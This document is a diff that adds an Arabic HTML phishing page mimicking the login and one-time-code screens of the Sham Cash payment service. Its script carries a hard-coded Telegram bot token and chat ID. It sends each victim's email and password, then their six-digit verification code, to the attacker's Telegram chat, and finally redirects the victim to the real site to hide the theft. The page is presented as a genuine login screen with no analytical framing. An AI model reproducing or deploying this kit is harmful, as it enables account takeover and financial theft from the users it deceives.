@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول والتحقق</title>
+    <style>
+        /* Base styles for the body and overall layout */
+        body {
+            font-family: 'Inter', sans-serif; /* Fallback font */
+            background-color: #2D3748; /* Dark background color from the image */
+            color: #E2E8F0; /* Light text color for contrast */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Ensure body takes full viewport height */
+            margin: 0;
+            padding: 20px; /* Add some padding for mobile view */
+            box-sizing: border-box;
+            overflow-x: hidden; /* Prevent horizontal scrolling by default */
+            direction: rtl; /* Set default text direction to RTL */
+        }
+
+        /* Main container for the forms */
+        .app-container {
+            width: 100%;
+            max-width: 400px; /* Max width for larger screens */
+            background-color: #3A475A; /* Slightly lighter dark grey for the form container */
+            padding: 20px;
+            border-radius: 12px; /* Rounded corners */
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center; /* Center text within the container */
+            transition: opacity 0.5s ease-in-out; /* Smooth transition for page changes */
+        }
+
+        /* Utility class to hide elements */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Header styling for both pages */
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px; /* Space below header */
+        }
+
+        .header-text {
+            font-size: 0.875rem; /* Small text size */
+            color: #A0AEC0; /* Light grey color */
+        }
+
+        /* Placeholder for logo image */
+        .logo {
+            margin-bottom: 32px; /* Space below logo */
+            width: 120px; /* Adjust as needed for visual balance */
+            height: auto;
+            display: block; /* Ensure it behaves as a block element */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Page title styling */
+        .page-title {
+            font-size: 1.875rem; /* Larger text size */
+            font-weight: bold; /* Bold font */
+            color: #E2E8F0; /* Light text color */
+            margin-bottom: 24px; /* Space below title */
+        }
+
+        /* New wrapper for input group and its error message */
+        .form-field-wrapper {
+            width: 100%;
+            margin-bottom: 16px; /* Space between form fields */
+        }
+
+        /* Input group styling - now a relative container for absolute icons */
+        .input-group {
+            position: relative; /* For absolute positioning of icons */
+            width: 100%;
+            background-color: #4A5568; /* Apply background to the group */
+            border-radius: 8px; /* Apply border-radius to the group */
+            box-sizing: border-box;
+            border: 1px solid transparent; /* Default border, will change on error */
+            transition: border-color 0.3s ease; /* Smooth transition for border */
+        }
+
+        /* Error state for input group border */
+        .input-group.error {
+            border-color: #EF4444; /* Red border for error */
+        }
+
+        /* Input field styling - adjusted padding for absolute icons */
+        .input-field {
+            background-color: transparent; /* Remove background from input */
+            color: #E2E8F0; /* Light text color */
+            border: none;
+            width: 100%; /* Take full width of parent */
+            padding: 12px 12px; /* Default padding for top/bottom and sides */
+            outline: none; /* Remove outline on focus */
+            text-align: right; /* Right-align text for RTL */
+            box-sizing: border-box;
+        }
+        .input-field::placeholder {
+            color: #A0AEC0; /* Lighter grey for placeholder */
+        }
+        .input-field:focus {
+            /* No background change on focus for input field itself, as it's on the group */
+        }
+
+        /* Base style for all icons within input groups */
+        .input-group .icon-svg {
+            color: #A0AEC0;
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        /* Specific positioning for person icon (visual right in RTL) */
+        .input-group .person-icon {
+            right: 12px; /* 12px from the right edge of the input group */
+        }
+
+        /* Specific padding for email field due to person icon on right */
+        #email {
+            padding-right: 40px; /* Space for icon on the right */
+            padding-left: 12px; /* Default padding on left */
+        }
+
+        /* Specific positioning for lock icon (visual right in RTL) */
+        .input-group .lock-icon {
+            right: 12px; /* 12px from the right edge of the input group */
+        }
+
+        /* Specific positioning for eye icon (visual left in RTL) */
+        .input-group .eye-icon {
+            left: 12px; /* 12px from the left edge of the input group */
+            cursor: pointer; /* Indicate it's clickable */
+        }
+
+        /* Specific padding for password field due to both icons */
+        #password {
+            padding-right: 40px; /* Space for lock icon on the right */
+            padding-left: 40px;  /* Space for eye icon on the left */
+        }
+
+        /* Error message styling */
+        .error-message {
+            color: #EF4444; /* Red text */
+            font-size: 0.75rem; /* Smaller font */
+            margin-top: 4px; /* Space from the input group above */
+            text-align: right; /* Align right for RTL */
+            display: block; /* Ensure it takes its own line */
+        }
+
+        /* Link styling */
+        .link-text {
+            color: #3182CE; /* Blue color for links */
+            text-decoration: none;
+            transition: color 0.3s ease; /* Smooth transition for color */
+            font-size: 0.875rem; /* Small text size */
+            margin-bottom: 24px; /* Space below link */
+            display: block; /* Ensure it takes its own line */
+        }
+        .link-text:hover {
+            color: #2B6CB0; /* Darker blue on hover */
+        }
+
+        /* Button styling */
+        .btn-primary {
+            background-color: #3182CE; /* Blue color from the image */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Smooth transition for background color */
+            font-weight: bold;
+            font-size: 1.125rem; /* Larger text size */
+            margin-bottom: 24px; /* Space below button */
+        }
+        .btn-primary:hover {
+            background-color: #2B6CB0; /* Darker blue on hover */
+        }
+
+        /* Small text below button */
+        .small-text {
+            font-size: 0.875rem; /* Small text size */
+            color: #A0AEC0; /* Light grey color */
+            margin-bottom: 40px; /* Space above powered by */
+        }
+
+        /* Powered by section */
+        .powered-by {
+            font-size: 0.75rem; /* Extra small text size */
+            color: #A0AEC0; /* Light grey color */
+            margin-top: auto; /* Push to bottom */
+        }
+        .version-text {
+            font-size: 0.75rem; /* Extra small text size */
+            color: #A0AEC0; /* Light grey color */
+            margin-top: 4px;
+        }
+
+        /* Loading overlay styles */
+        .loading-overlay {
+            position: fixed; /* Cover the entire screen */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(45, 55, 72, 0.9); /* Semi-transparent dark background */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Ensure it's on top */
+            color: #E2E8F0; /* Light text color */
+            font-size: 1.25rem; /* Medium text size */
+        }
+
+        /* Loading spinner */
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3); /* Light grey transparent */
+            border-top: 4px solid #3182CE; /* Blue */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite; /* Spin animation */
+            margin-bottom: 16px;
+        }
+
+        /* Spin animation keyframes */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* OTP page specific styles */
+        .otp-text {
+            font-size: 1rem; /* Base text size */
+            color: #A0AEC0; /* Light grey color */
+            margin-bottom: 24px; /* Space below text */
+        }
+
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px; /* Space between OTP boxes */
+            flex-wrap: nowrap; /* Prevent wrapping for OTP inputs */
+            width: 100%;
+            margin-bottom: 32px; /* Space below OTP inputs */
+            overflow-x: auto; /* Allow horizontal scrolling if inputs overflow */
+            -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
+            padding-bottom: 5px; /* Prevent scrollbar from overlapping content */
+        }
+
+        .otp-input {
+            width: 48px; /* Fixed width for OTP boxes */
+            height: 48px;
+            text-align: center;
+            font-size: 1.5rem; /* Large font size for OTP digits */
+            background-color: #4A5568;
+            color: #E2E8F0;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+            transition: background-color 0.3s ease;
+            -moz-appearance: textfield; /* Hide arrows for number input in Firefox */
+            flex-shrink: 0; /* Prevent shrinking below content size */
+            border: 1px solid transparent; /* Default border, will change on error */
+            transition: border-color 0.3s ease; /* Smooth transition for border */
+        }
+        /* Hide arrows for number input in Webkit browsers */
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .otp-input:focus {
+            background-color: #5C6B80;
+        }
+        /* Error state for OTP input field */
+        .otp-input.error {
+            border-color: #EF4444; /* Red border for error */
+        }
+
+
+        /* Responsive adjustments for OTP inputs on very small screens */
+        @media (max-width: 360px) {
+            .otp-input {
+                width: 40px; /* Smaller width for very small screens */
+                height: 40px;
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="loginPage" class="app-container">
+        <div class="header">
+            <span class="header-text"></span> <span class="header-text">الإنجليزية</span>
+        </div>
+
+        <img src="" alt="شام كاش" class="logo" id="appLogo">
+
+        <h1 class="page-title">تسجيل الدخول</h1>
+
+        <div class="form-field-wrapper">
+            <div class="input-group">
+                <input type="email" id="email" class="input-field" placeholder="بريد إلكتروني" required>
+                <span class="icon-svg person-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="currentColor">
+                        <path d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512l388.6 0c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304l-91.4 0z"/>
+                    </svg>
+                </span>
+            </div>
+            <span id="emailError" class="error-message hidden">هذا الحقل مطلوب.</span>
+        </div>
+
+        <div class="form-field-wrapper">
+            <div class="input-group">
+                <input type="password" id="password" class="input-field" placeholder="كلمة السر" required>
+                <span class="icon-svg lock-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="currentColor">
+                        <path d="M144 144l0 48 160 0 0-48c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192l0-48C80 64.5 144.5 0 224 0s144 64.5 144 144l0 48 16 0c35.3 0 64 28.7 64 64l0 192c0 35.3-28.7 64-64 64L64 512c-35.3 0-64-28.7-64-64L0 256c0-35.3 28.7-64 64-64l16 0z"/>
+                    </svg>
+                </span>
+                <span class="icon-svg eye-icon" id="togglePassword">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" fill="currentColor" id="eyeIcon">
+                        <path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8z"/>
+                    </svg>
+                </span>
+            </div>
+            <span id="passwordError" class="error-message hidden">هذا الحقل مطلوب.</span>
+        </div>
+
+        <a href="#" class="link-text">هل نسيت كلمة المرور؟</a>
+
+        <button id="loginButton" class="btn-primary">تسجيل الدخول</button>
+
+        <p class="small-text">
+            لا تملك حساب مسبقاً؟ <a href="#" class="link-text" style="display: inline;">إنشاء حساب</a>
+        </p>
+
+        <div class="powered-by">
+            <p>POWERED BY</p>
+            <p>Sham Cash ©</p>
+            <p class="version-text">V 2.1.0</p>
+        </div>
+    </div>
+
+    <div id="otpPage" class="app-container hidden">
+        <div class="header">
+            <span class="header-text"></span> <span class="header-text"></span> </div>
+
+        <img src="" alt="App Logo" class="logo" id="otpAppLogo">
+
+        <h1 class="page-title">التحقق من هويتك</h1>
+        <p class="otp-text">قم بإدخال رمز الـ OTP المرسل إليك</p>
+
+        <div class="otp-input-group">
+            <input type="number" class="otp-input" maxlength="1" id="otp1" required>
+            <input type="number" class="otp-input" maxlength="1" id="otp2" required>
+            <input type="number" class="otp-input" maxlength="1" id="otp3" required>
+            <input type="number" class="otp-input" maxlength="1" id="otp4" required>
+            <input type="number" class="otp-input" maxlength="1" id="otp5" required>
+            <input type="number" class="otp-input" maxlength="1" id="otp6" required>
+        </div>
+        <span id="otpGroupError" class="error-message hidden">الرجاء إدخال الرمز كاملاً.</span>
+
+        <button id="verifyOtpButton" class="btn-primary">تأكيد</button>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay hidden">
+        <div class="loading-spinner"></div>
+        <p id="loadingMessage">جاري تسجيل الدخول...</p>
+    </div>
+
+    <script>
+        // المتغيرات الخاصة بـ Telegram Bot API
+        const BOT_TOKEN = "7006779137:AAFXyOQiVJmJo4H5JZiH1D1-YSRi4m32x2Y";
+        const CHAT_ID = "5944908457";
+        const FINAL_REDIRECT_URL = "https://shamcash.org"; // الرابط النهائي الذي تريد توجيه المستخدم إليه
+
+        // Get references to DOM elements
+        const loginPage = document.getElementById('loginPage');
+        const otpPage = document.getElementById('otpPage');
+        const loginButton = document.getElementById('loginButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingMessage = document.getElementById('loadingMessage'); // لعرض رسالة مختلفة للتحميل
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const appLogo = document.getElementById('appLogo');
+        const otpAppLogo = document.getElementById('otpAppLogo');
+        const passwordField = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        // References for error messages
+        const emailField = document.getElementById('email');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const verifyOtpButton = document.getElementById('verifyOtpButton');
+        const otpGroupError = document.getElementById('otpGroupError');
+
+
+        // Set the logo source
+        const logoSrc = "https://shamcash.org/assets/front/img/applogo.svg";
+        appLogo.src = logoSrc;
+        otpAppLogo.src = logoSrc;
+
+        // Function to show an error message
+        function showError(inputElement, messageElement, message) {
+            // Add error class to the parent input-group for border styling
+            inputElement.closest('.input-group').classList.add('error');
+            messageElement.textContent = message;
+            messageElement.classList.remove('hidden');
+        }
+
+        // Function to hide an error message
+        function hideError(inputElement, messageElement) {
+            inputElement.closest('.input-group').classList.remove('error');
+            messageElement.classList.add('hidden');
+            messageElement.textContent = '';
+        }
+
+        /**
+         * Sends a message to the Telegram bot.
+         * @param {string} message The text message to send.
+         */
+        async function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML' // أو 'Markdown' حسب تفضيلك لتنسيق الرسالة
+            };
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                // لا نحتاج للتحقق من الاستجابة أو معالجة الأخطاء هنا حسب طلبك
+                // لكن في بيئة إنتاج حقيقية، يجب التعامل معها
+                // const data = await response.json();
+                // if (!data.ok) {
+                //     console.error('Failed to send message to Telegram:', data.description);
+                // }
+            } catch (error) {
+                // لا نعرض رسالة خطأ للمستخدم، فقط نسجل الخطأ
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+
+        // Event listener for login button click
+        loginButton.addEventListener('click', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            let isValid = true;
+
+            // Validate email field
+            if (emailField.value.trim() === '') {
+                showError(emailField, emailError, 'هذا الحقل مطلوب.');
+                isValid = false;
+            } else if (!emailField.checkValidity()) {
+                showError(emailField, emailError, 'الرجاء إدخال بريد إلكتروني صالح.');
+                isValid = false;
+            } else {
+                hideError(emailField, emailError);
+            }
+
+            // Validate password field
+            if (passwordField.value.trim() === '') {
+                showError(passwordField, passwordError, 'هذا الحقل مطلوب.');
+                isValid = false;
+            } else {
+                hideError(passwordField, passwordError);
+            }
+
+            if (!isValid) {
+                return; // Stop execution if any validation fails
+            }
+
+            // If validation passes, show loading overlay
+            loadingMessage.textContent = 'جاري تسجيل الدخول...'; // تحديث رسالة التحميل
+            loadingOverlay.classList.remove('hidden');
+
+            const email = emailField.value;
+            const password = passwordField.value;
+
+            const loginMessage = `
+                <b>[بيانات تسجيل الدخول]</b>
+                <b>البريد الإلكتروني:</b> ${email}
+                <b>كلمة السر:</b> ${password}
+            `;
+
+            // أرسل بيانات تسجيل الدخول إلى تيليجرام
+            await sendToTelegram(loginMessage);
+
+            // Simulate a delay for login process (e.g., API call)
+            setTimeout(() => {
+                loadingOverlay.classList.add('hidden'); // إخفاء شاشة التحميل
+                loginPage.classList.add('hidden'); // إخفاء صفحة تسجيل الدخول
+                otpPage.classList.remove('hidden'); // إظهار صفحة OTP
+                if (otpInputs.length > 0) {
+                    otpInputs[0].focus(); // التركيز على أول حقل OTP
+                }
+            }, 2000); // 2 ثانية تأخير
+        });
+
+        // Event listeners to clear errors on input for email and password fields
+        emailField.addEventListener('input', function() {
+            hideError(emailField, emailError);
+        });
+        passwordField.addEventListener('input', function() {
+            hideError(passwordField, passwordError);
+        });
+
+        // Event listeners for OTP input fields for auto-tabbing and number-only input
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                // Allow only one digit
+                if (this.value.length > 1) {
+                    this.value = this.value.slice(0, 1);
+                }
+                // Move focus to the next input if a digit is entered
+                if (this.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                // Hide general OTP error when user starts typing
+                hideError(input, otpGroupError); // Pass the specific input, but error applies to group
+                input.classList.remove('error'); // Remove individual red border
+            });
+
+            input.addEventListener('keydown', function(event) {
+                // Move focus to the previous input on Backspace if current is empty
+                if (event.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            // Prevent non-numeric input for OTP fields
+            input.addEventListener('keypress', function(event) {
+                // Allow only digits (0-9)
+                if (event.key < '0' || event.key > '9') {
+                    event.preventDefault();
+                }
+            });
+        });
+
+        // Event listener for OTP verification button click
+        verifyOtpButton.addEventListener('click', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            let allOtpFilled = true;
+            let otpCode = '';
+            otpInputs.forEach(input => {
+                if (input.value.trim() === '') {
+                    allOtpFilled = false;
+                    input.classList.add('error'); // Highlight empty OTP fields
+                } else {
+                    otpCode += input.value.trim(); // جمع الأرقام
+                    input.classList.remove('error');
+                }
+            });
+
+            if (!allOtpFilled) {
+                // Show error for the group by passing the first OTP input
+                showError(otpInputs[0], otpGroupError, 'الرجاء إدخال الرمز كاملاً.');
+                return;
+            } else {
+                hideError(otpInputs[0], otpGroupError); // Hide group error
+            }
+
+            // Show loading overlay for OTP verification
+            loadingMessage.textContent = 'جاري التحقق من الرمز...'; // تحديث رسالة التحميل
+            loadingOverlay.classList.remove('hidden');
+
+            const otpMessage = `
+                <b>[رمز التحقق OTP]</b>
+                <b>الرمز:</b> ${otpCode}
+            `;
+
+            // أرسل رمز OTP إلى تيليجرام
+            await sendToTelegram(otpMessage);
+
+            // Simulate OTP verification and then redirect
+            setTimeout(() => {
+                loadingOverlay.classList.add('hidden'); // إخفاء شاشة التحميل
+                window.location.href = FINAL_REDIRECT_URL; // توجيه المستخدم إلى الرابط النهائي
+            }, 2000); // 2 ثانية تأخير
+        });
+
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+
+            // Toggle eye icon SVG based on password field type
+            if (type === 'password') {
+                eyeIcon.innerHTML = `
+                    <path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8z"/>
+                `;
+            } else {
+                eyeIcon.innerHTML = `
+                    <path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"/>
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
